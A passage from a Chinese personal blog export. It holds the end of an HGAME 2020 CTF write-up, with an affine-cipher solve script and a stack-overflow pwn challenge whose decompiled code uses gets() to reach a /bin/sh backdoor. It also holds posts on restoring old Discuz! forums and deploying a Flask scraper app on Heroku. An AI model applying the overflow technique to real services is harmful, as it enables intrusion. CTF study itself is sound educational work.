operator">+=</span> <span class="token number">1</span><span class="token comment" spellcheck="true"># 求解得到对应的ii</span><span class="token comment" spellcheck="true"># A 46</span><span class="token comment" spellcheck="true"># 8 33</span><span class="token comment" spellcheck="true"># I 43</span><span class="token comment" spellcheck="true"># 5 30</span><span class="token comment" spellcheck="true"># z 0</span></code></pre><p>得到了字母对应的i和ii，而<strong>i与ii满足关系 <code>(A*i+B) % 62 = ii</code></strong>，从而可以把A、B解出来。</p><p>查了查<strong>模逆运算</strong>，看了看觉得有点麻烦emmm</p><p>猜想A、B不会太大，干脆直接遍历好了。。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> A <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> B <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">46</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">33</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">43</span> <span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Yes: "</span><span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Yes:  13 14</span></code></pre><p>得到A=13，B=14.</p><p>接下来还原flag。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Begin to decrypt...</span>A <span class="token operator">=</span> <span class="token number">13</span>B <span class="token operator">=</span> <span class="token number">14</span>str_encrypt <span class="token operator">=</span> <span class="token string">'xr1AJ7havGTpH410'</span>str_decrypt <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">:</span>    ii <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span>        <span class="token keyword">if</span> temp <span class="token operator">==</span> ii<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            str_decrypt <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypt<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># M4thu5EdiNcRYpt0</span><span class="token comment" spellcheck="true"># So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`.</span></code></pre><p>这里先把<code>_</code>给去掉了，最后再加上。</p><p>于是乎flag就是：</p><p><code>hgame{M4th_u5Ed_iN_cRYpt0}</code></p><blockquote><p>看来果然是数学啊2333，还想看看大佬们怎么用数学方法解出来的。（（</p><p>如题目所言——  </p><blockquote><p>Some basic modular arithmetic…</p></blockquote></blockquote><blockquote><p><em>Reference:</em> 一点关于模逆运算的介绍，后面有空再看看吧（x</p><p><a href="https://blog.csdn.net/lion19930924/article/details/61926019" target="_blank" rel="noopener">https://blog.csdn.net/lion19930924/article/details/61926019</a></p></blockquote><hr><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>nc 47.103.214.163 20000</p><p>IDA分析一波，发现是memcmp比较，<code>backdoor</code>函数里是执行<code>/bin/sh</code>的。</p><p>其中s与v5距离为 -31h-(-ACh)=123，构造payload发了个<code>"0O0o"</code>过去，发现么得。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-ACh]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Bh] [ebp-31h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+A0h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+A4h] [ebp-8h]</span>  v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xA0u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's 0O0o\\0O0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token string">"0O0o"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">7u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>20200125更新：</strong></p><p>看了官方WP，草（一种植物），好气啊，<code>\x00</code>把字符串识别隔断了。</p><p><img src="/2020/01/23/CTF_Hgame2020/pwn_Hard_AAAAA.png" alt="image-20200125172242766"></p><hr><hr><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a><strong>未完待续</strong></h2><p><em>（可能会咕咕咕</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 重建那些年基于Discuz!系统搭建的满是回忆的班级网站</title>
      <link href="/2020/01/09/Idea_RebuildClassWebsite/"/>
      <url>/2020/01/09/Idea_RebuildClassWebsite/</url>
      
        <content type="html"><![CDATA[<p><strong>2020年第一篇哈，先祝大家新年快乐，每天都有新收获喵！</strong>  </p><p>哇呜！今天终于下了今年的第一场雪，贼惊喜~（然而积不起来啊嘤嘤嘤</p><p><br><br></p><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>最近期末考试月忙死了，刚考完一科，难得有空来浪一下。考完一科浪两天然后作死复习的是我了emmm嘤嘤嘤。</p></blockquote><p>有一次和奶冰冰聊天，回忆起之前折腾过的、搭建过的各种网站，而后就想到了N年以前搭建的班级网站。</p><p>（很明显，那时候提供网络服务的各种空间、域名什么的到现在没几个还能用的了。</p><p>2017年10月的时候，我的邮箱突然收到了一封来自Red Hat的邮件，提醒我OpenShift Online v2 <strong>End of Life</strong>了。↓</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life.jpg" alt="End_of_Life" style="max-width:40%;"><p>那时候感觉特别惊喜，毕竟到那时已经放在那上面四五年了，我都差点忘记它的存在了。虽然域名早就炸了，但是这个<em>免费的</em>云平台居然还在（这个角度看来 Red Hat 还是挺可靠的233）。</p><p>那时就登上去看了一下，哇呜数据居然都还在，通过默认的域名还访问到了网站，于是好怀念啊，为了留个纪念就截了个图。</p><blockquote><p>N年前先建了10班的班网论坛，<em>（分班后）</em>又建了个8班的班网。    </p></blockquote><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot2.jpg" alt="img" style="max-width:50%;"><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="img" style="max-width:50%;"><p>​    几天之后，果不其然，<strong>Unavailable了</strong>。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life2.jpg" alt="End_of_Life2" style="max-width:43%;"><p>不过还好那时候就有备份的好习惯（不是），试了几个密码登录进了8班的班网，然后把数据库给备份下来了，不过也只备份了数据库，附件啊头像啊这些就没备份下来。10班的班网（更是由于记不得密码了）就没成功备份emmm。</p><blockquote><p>于是现在就觉得有点遗憾，通过<em>phpMyAdmin</em>其实可以直接导出数据库的；在重建的时候知道通过修改数据库可以把创始人密码修改的。</p><p>但那时候不大清楚这些，也有可能是那时连服务器密码都不记得了（（（</p></blockquote><hr><p>最近这几天就想，干脆试一下，看看能不能重建那时候的班网吧。</p><h2 id="重建折腾记"><a href="#重建折腾记" class="headerlink" title="重建折腾记"></a>重建折腾记</h2><h3 id="辣鸡服务器配置出了一堆问题"><a href="#辣鸡服务器配置出了一堆问题" class="headerlink" title="辣鸡服务器配置出了一堆问题"></a>辣鸡服务器配置出了一堆问题</h3><p>之前都没有自己动手在裸机上配置WEB环境来着，Linux也没有多少经验，于是乎上手就比较痛苦。</p><blockquote><p>下面是一堆废话emmm</p><p><strong>不想看就直接跳过这节吧。</strong></p></blockquote><p>租服务器的时候<em>图省事</em>直接装了<code>PHPStudy</code>，里面集成了<code>LNMP</code>环境，然后网站什么的直接可以在上面配置。</p><p>之前搭了几个测试用的网站，运行都没什么问题，能正常访问。</p><p>然而这次我建了一个新的<code>PHP</code>环境，打开端口，访问的时候居然报<strong>403无权限</strong>，但是其他的网站都没这个问题。</p><p>看到网页上是<code>nginx</code>报的错，很自然怀疑就是它的问题。检查了一下配置没发现问题，于是重装了一下。这回直接报<strong>500内部服务器错误</strong>了。（我愣住了</p><p>看了一下错误log，发现很多是无权限，还有的找不到文件？？？</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/error_log.png" alt=""></p><p>复制粘贴搜了一下，怀疑是动态链接库的问题，于是<code>ln</code>尝试创建链接，然而不成功。</p><p>然后不想管了，关闭<code>nginx</code>服务，启动<code>apache</code>服务，这回还是<strong>403</strong>，其他的网站就没问题，绝了。</p><p>换回<code>nginx</code>，将配置文件中的<code>user</code>由<code>www</code>更改为<code>root</code>，再试居然好了！看来果然是<strong>权限的问题</strong>，然而我之前好像并没有改过什么配置，也不清楚<code>www</code>用户为啥就没权限了。</p><p><code>root</code>毕竟不太安全吧，于是又改了回去，403了。</p><p>登录服务器看了一下，几个网站目录下就只有新建的这个用户组是<code>root</code>，修改了目录权限，允许others执行，再访问，没问题了。</p><p>但很奇怪啊为啥就不行啊。</p><p>于是又重装了一次<code>nginx</code>，同时还卸掉了它的防火墙，这次没问题了emmm。再装回防火墙，又炸了。</p><p>WAF的问题啊。</p><p>这时候后台改参数也有报无权限的，就很懵逼。</p><p>于是干脆直接<code>reboot</code>好了。</p><p><strong><em>（有句话说得好，重启解决绝大部分问题</em></strong></p><p>进入后台，先关闭<code>nginx</code>，重装WAF，再开启<code>nginx</code>。这回终于没毛病了。（x</p><br><hr><h3 id=""><a href="#" class="headerlink" title=""></a><br></h3><h3 id="重建8班班网"><a href="#重建8班班网" class="headerlink" title="重建8班班网"></a>重建8班班网</h3><p>重建其实类似于搬家，于是看了几篇关于<code>Discuz!</code>搬家的教程，发现距今都有一段历史了。</p><p>去官方论坛找到了最新的<strong>X3.4版本</strong>的下载链接，发现指向了gitee，刚开始还觉得有点意思，然而当我点开链接发现连接不上gitee服务器，难道炸了？？？换了一个网络，连上了。（吐槽一下辣鸡宽带，估计是DNS出了点问题8  </p><p><strong>啊不是！！！</strong></p><p>别想着啥都想装最新的，得先考虑你要<strong>重建/恢复的系统是什么版本</strong>的啊！还要注意<strong>PHP的版本</strong>，以及<strong>语言编码（GBK/UTF8/BIG5/？）</strong>（就因为这个删掉又重建了好几个版本</p><p>论坛的版本可以在你备份的数据库<code>.sql</code>文件头部注释里看到。（这个还是后面重建10班班网时才发现的</p><p>不要像我一样装了发现用不了嘤嘤嘤。</p><ul><li><code>upload</code>文件夹打包传到服务器上，解压，然后访问网站。</li></ul><blockquote><p>草怎么又403了。</p></blockquote><blockquote><p>检查了一下文件发现是root所属，原来是之前一直以root身份操作的问题，更改用户组为<code>www</code>，这回能正常访问了。</p></blockquote><ul><li>按照安装流程全新安装<code>Discuz!</code>系统。这里的数据库要自己提前建好，表前缀和你要重建的一致，一般就不用更改。  </li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot1.png" alt=""></p><ul><li>安装完成，访问主页是默认的界面。（略）</li><li>根据官方的搬家教程，把<code>utility/restore.php</code>文件上传到网站的<code>data/</code>目录下，再把要恢复的数据库整个目录也上传到<code>data/</code>下，然后通过<code>网站域名/data/restore.php</code>访问数据恢复页面。</li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot2.png" alt=""></p><blockquote><p>然而这里我被自己的WAF给拦住了233。</p><p>开了白名单再导入，这时候过了一段时间报<strong>504</strong>了emmm。（我又懵了，难得让我见到了好多错误页面，我没事的嘤嘤嘤  </p><p>重试，如旧，同时发现cpu是100%在跑的（唉性能果然不咋样。</p></blockquote><blockquote><p>搜了各种资料，把nginx的超时和PHP执行时间都改了，还是504…  </p><p>看了一下<code>.sql</code>文件，干脆不用整个工具，直接导入mysql好了啦。  </p><p>虽然期间还报了几个错，但还是导完了呢。</p></blockquote><ul><li><p>访问主页，哇好惊喜啊，之前的分类、帖子什么都回来了。</p></li><li><p>用原始的创始人账号登录后台，<strong>更新缓存</strong>。</p><blockquote><p>这里也折腾了老半天，不是安装论坛系统时候创建的，而是重建的老用户。</p><p>毕竟整个数据库都改回去了嘛。</p><p>至于忘记密码，emmm后面再说。</p></blockquote></li><li><p>再刷新主页，这回数据基本能正常访问了，页面配置也恢复到了之前的状态。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-17-56-47-58.jpg" style="max-width:40%;"></li><li><p>（如果有的话）<strong>恢复logo、favicon、attachment、avatar、plugin、template等。</strong></p><p>这里由于之前只备份了logo，其他数据基本没备份（或者说我的硬盘里没备份）emmm，就么的办法了。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-02-23-26-12.png" alt="恢复后的班网" style="max-width:50%;"></li></ul><p>看了看上面的帖子，<em>全是黑历史啊</em>……（黑脸.png</p><p>用户数据都恢复了，理论上能用原来的信息进行登录。</p><p>然而图片什么的都没了，之前很多外链的图片、插件都失效了，其实问题也不大吧。</p><p><strong>不过能重建了也总比没有要好呀！嘻嘻嘻。</strong></p><p>毕竟这个版本有很多安全漏洞了，<strong>出于安全考虑，这里就不公开了啦</strong>。</p><p><br><br></p><hr><br><h3 id="重建10班班网"><a href="#重建10班班网" class="headerlink" title="重建10班班网"></a>重建10班班网</h3><p>上面说了云平台<code>End of Life</code>的时候没有备份这个数据的。</p><p>但是我找遍了硬盘，终于<strong>翻出了那时候备份的部分数据</strong>。</p><p>有了上面重建的经验，本以为就很轻松上手的，没想到还是遇到了一堆问题。  </p><p>首先还是版本的问题。</p><p>本以为<code>X3.2</code>版本已经够老了，没想到这里最后一直回退到了<strong><code>X2</code>版本</strong>（噗</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot3.png" alt="安装过的版本"></p><p><strong><em>鬼懂得我重建了多少次网站emmmm</em></strong></p><ul><li>期间有一次是<strong>PHP版本错了</strong>，毕竟之前的版本一般只支持5.x来着，然后我装了7.x。</li></ul><ul><li>有一次是<strong>MySQL数据库炸了</strong>，装完之后主页都打不开，直接报的<code>database error</code>。然后卸掉了数据库，换了老一点的版本，发现装好了永远启动不了。最后发现是之前卸载有残留，绝了。清了一遍残留重装，再重启服务就好了。</li></ul><ul><li>还有一次是<strong>Discuz版本</strong>装的<code>X2.5</code>，本来挺开心的，导完数据更新完缓存，点开帖子就报<code>database error</code>，说找不到某某记录吧。最后版本降到<code>X2</code>终于好了，估计是版本升级过程中修改了这部分数据库或操作数据库的代码吧。</li></ul><ul><li>还有每一次都遇到了<strong><code>.sql</code>导不进数据库</strong>的问题，因为这个数据库更大了，即使改了nginx和PHP的配置，在网页上导入还是永远报504，最后是一边看着CPU状态，一边从后台导入的。前端报了504，CPU还在跑，虽然SQL还报过好几种错但最后还是导入完成了。。（我太难了</li></ul><ul><li><p>噢还有那个<strong>创始人密码忘了</strong>的问题。</p><p>查了一下资料，一个方案是尝试登录<code>UC_Center</code>，如果成功登录的话可以在里面更新创始人的密码，再用更新后的密码登录<code>Discuz</code>的管理后台就行了。（这里用的就是这个方案）</p><p>另一个方案是修改数据库里面的用户相关的表，先改成一个比较简单的密码（好像是MD5加密），登录进去再修改。这里没用试过就不说了啦。</p></li></ul><hr><p><strong>重建完成之后访问主页。</strong></p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-23-23-25-80.png" alt=""></p><p>草，原来这个是那时候<strong>更新版本前的最后一次备份</strong>emmm</p><p>（看亚子是第四代，最后更新的是第五代了，看了半天才想起来）</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot4.png" alt="10班班网重建"></p><p>找了一下发现部分附件和头像之类的也有备份（更古老的数据了）。于是又折腾了一会儿把能恢复的数据给恢复了。</p><p>于是乎最后重建出来的是2013年1月的备份了。</p><p>怎么说好呢，其实问题也不大吧，<strong>真·回忆啊！</strong></p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-01-57-55-85.jpg" style="max-width:50%;"><p>这个版本的安全漏洞更多了，同样就<strong>不公开了，看看就好了啦</strong>。</p><p><br><br></p><p>emmm下面这个是<strong>恢复不了的第五代版本</strong>（真就只有这张图了嘤嘤嘤）。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="第五代班网" style="max-width:50%;"><p><br><br></p><hr><p><br><br></p><h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2><ol><li><p>Linux权限管理还是很严格的，这回体验到了，有空再研究研究。</p><br></li><li><p>选对合适的版本，不要总想着用最新的。</p><br></li><li><p>看了<code>Discuz!</code>系统之前的老版本，都是把GBK编码的版本放在前面，不过现在都是推荐安装UTF-8编码版本了。</p><p>包括其他很多地方基本上就UTF-8了，感觉也算是个趋势吧，毕竟是国际编码，通用性强嘛。</p><br></li><li><p>去<code>Discuz!</code>官方论坛看了看，感觉明显冷清了。包括在后台看插件应用市场，基本上就变成了商业化的交易了，就有点怀念N年前那时候社区还很活跃，有一堆免费的还互相分享来着。（不过也算是时代趋势吧233</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_plugin.png" alt="部分之前备份的插件"></p><br></li><li><p>其实还找到了以前可能折腾过的各种建站系统233。</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_websystem.png" alt="可能折腾过的各种建站系统"></p><br></li><li><p>然后就想到<strong>纸飞机</strong>了嘤嘤嘤。今天去看了一下，发现纸飞机还能访问i，只是论坛关闭了，个人空间和视频区还是开放的，而且版本是X3.4算是最新的大版本了。（不知道于老板是不是还维护过</p><br></li><li><p>写这篇blog的时候又去<code>OpenShift</code>看了一下，发现现在都升级到 V4.2 版本了。增加了很多现在很实用很热门的<code>Serverless</code>、 <code>CI/CD</code>之类的，现在的<code>Starter plan</code>也是免费的，不过感觉加了不少限制吧（毕竟减少滥用节约资源嘛）。感兴趣的还可以看看下面的链接。</p></li></ol><blockquote><p>版本介绍：<a href="https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/" target="_blank" rel="noopener">https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/</a></p><p>产品介绍：<a href="https://www.openshift.com/products/online/" target="_blank" rel="noopener">https://www.openshift.com/products/online/</a></p></blockquote><p>​        <br></p><ol start="8"><li><p>备份是个好习惯，<strong>CTRL+S</strong>也是。</p><br></li><li><p>看了看之前的帖子，发现全都是黑历史……</p><p>然后惊喜地发现，之前的外链难得有几个还能访问，进去一看发现是以前的教育博客，居然一直运营到了现在，而且以前的文章都在。全是回忆啊。。</p><p>等我有空再把上面以前发的文章爬下来备份一份23333.</p><br></li><li><p>有问题欢迎来交流哈哈哈。</p></li></ol><p>溜了溜了喵</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Discuz </tag>
            
            <tag> 班网 </tag>
            
            <tag> 重建 </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUAA_iCal_Web在线版本部署</title>
      <link href="/2019/12/29/Tech_NUAAiCalWeb_deploy/"/>
      <url>/2019/12/29/Tech_NUAAiCalWeb_deploy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>主要是简单记录一下Heroku的部署，毕竟一不小心就忘记该怎么折腾的了…</p><p>（其实应该两周前写这篇blog的，现在已经忘了很多了嘤嘤嘤  </p></blockquote><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>之前折腾了一两个月，做了个把课表导出到ical日历文件的小jio本，即 <code>NUAA_ClassSchedule</code><br>GitHub链接：<a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">click here</a><br><a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_ClassSchedule</a>  </p><p>其中有一个TODO是搭建一个web端，实现在线导出。</p><p>实际上，在教务系统加入验证码之前，已经和奶冰一起做了一个可以用的web端了，只不过只是简单测试还没公开啥的。</p><p>然而，这个验证码一加就麻烦了……之前做的登录显然就不成功了。</p><p>解决方案的话，在本地，是通过把验证码下载下来，PIL调用本地图片查看器来显示，进而在命令行里输入。</p><p>不过web端就有点麻烦了。</p><p>但怎么说好呢，不妨碍用同样的思路解决这一问题呢嘻嘻嘻。后面再说。</p><blockquote><p>其实到写这篇blog为止还没弄清楚他验证码的具体机理。（等我考完试有空再折腾好了喵</p></blockquote><p><strong>不想往下看又想体验<code>NUAA_iCal_Web</code>在线版本的，<a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">点这里</a>访问吧。</strong>   </p><p><br><br></p><hr><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><h3 id="Heroku简介"><a href="#Heroku简介" class="headerlink" title="Heroku简介"></a><em>Heroku</em>简介</h3><p>偶尔有一天在转GitHub的时候，看到某个项目下有个网页端的界面，README里面也有个<code>deploy with heroku</code>之类的图标按钮。点进去看了看，然后再查了查资料。</p><blockquote><p><em>Heroku</em> is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud.  </p></blockquote><blockquote><p>Heroku是一个支持多种编程语言的云平台即服务。在2010年被Salesforce.com收购。Heroku作为最开始的云平台之一，从2007年6月起开发，当时它仅支持Ruby，但后来增加了对Java、Node.js、Scala、Clojure、Python以及（未记录在正式文件上）PHP和Perl的支持。基础操作系统是Debian，在最新的堆栈则是基于Debian的Ubuntu。</p></blockquote><p>好东西呀！</p><p>发现heroku可以在一定程度上免费搭建网站，当然前提是要有一个wsgi接口之类的，大概意思就是说需要让你的东西能通过网络访问得到。  </p><blockquote><p>其实那时候我连wsgi是啥都不知道……  </p></blockquote><p>官网链接：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>具体的定价策略参见<a href="https://www.heroku.com/pricing" target="_blank" rel="noopener">这里</a>。  </p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/price.png" alt="price">  </p><p>Free版本的话，未认证用户每个月550小时免费动态时长，认证用户（好像是绑定银行卡）1000小时；30分钟无访问无活动的话会自己睡大觉，不会占用你的宝贵时长；提供二级域名，还可以自己绑米。  </p><p><strong>对于nuaaical来说，这个完全够用了呢！</strong>  </p><p>那就干脆折腾一下好了。  </p><p><br><br></p><h3 id="NUAA-iCal-Web端搭建"><a href="#NUAA-iCal-Web端搭建" class="headerlink" title="NUAA iCal Web端搭建"></a>NUAA iCal Web端搭建</h3><p>需要一个wsgi接口之类的嘛，flask、django这些现成的就行。</p><p>本来就啥也不知道也没玩过，看来一下flask挺简单的，于是就简单学了一下<strong>flask框架</strong>。</p><p>然而真正搭建的过程中遇到了一堆奇妙的bug，本地跑着好好的，上了heroku就炸了。（这个不细说了  </p><p>实际上代码就是从本地版本改的，毕竟在开发的时候留了很多现成的接口了，改一改调用一下函数之类的就完事了。</p><p>不过这个<strong>验证码</strong>折腾了老半天。</p><p>这里的策略是，当你访问页面的同时，后端去访问教务系统，把验证码图片爬下来送给前端，同时建立了一个与你有关的session。</p><p>当你post用户名密码及验证码后，后端利用同一个session去访问教务系统，<br>进而爬取课表及考试信息，<br>生成icalendar日历文件，<br>而后以附件下载的形式构造response，从而得到属于你的ical课表。  </p><br><p>当然，一定程度上安全一点，这个session在构造完response之后就销毁了，不保留在云平台上。</p><p>（这样其实还是没搞清楚验证码的机理，一定程度上相当于绕过了而已。</p><p>其实到这的话，本地搭建就结束了。</p><hr><p>不过还考虑了一下<strong>复杂的生产环境</strong>……  </p><ul><li><p>比如说<strong>登录信息重复post</strong>，而原来的验证码就不再有效了。</p><p>这里其实想了几种方案，但是行不通。最后干脆折腾了一波HTML，加了个前端界面，如果没登陆成功就提示一下，然后过一会儿返回主页好了。233</p><p><strong>（有更好的方案欢迎提出喵！</strong></p></li><li><p>比如<strong>未登录情况下直接访问导出ical的页面</strong>  </p><p>这个也是直接返回主页了。不过这里这个判断折腾了老半天。</p><p>最后的方案是在flask的session里建立了一个属于当前session的bool变量，默认为False，登录以后设置为True。</p><blockquote><p>之前直接写在程序的全局变量里，本地跑着好好的，上云平台就炸了……再见。   </p><p>还写过在flask的g变量里，后来仔细查了资料，g变量好像是只在当前页面请求中有效，意思就是作用范围不一样，于是否决了。</p></blockquote></li><li><p>教务系统<strong>连接已重置</strong></p><p>这个是他教务系统的问题啊，难顶了。还是折腾了老半天才发现这里的问题。  </p><p>又改了改登录的延时，这回变成随机延时了，而且时间也加长了。  </p><p>而且还把爬虫的UA改成了当前浏览器的UA。IP的话好像没办法了。   </p><p>问题有所改善…然而偶尔还存在。</p><p><strong>大不了多试几次就好了。</strong></p></li><li><p>etc.</p></li></ul><blockquote><p>其实还有个打算是做个前端ifram框架之类的直接嵌套官方的登录界面，然后登录成功后再利用登录信息来爬取课表，这样一定程度上可能还更安全一点。<br>再说吧……</p></blockquote><br><hr><br><h3 id="Heroku搭建"><a href="#Heroku搭建" class="headerlink" title="Heroku搭建"></a>Heroku搭建</h3><p>下面来简单记录一下Heroku的部署。</p><ol><li><p><strong>注册一个账号</strong></p><p>网址<a 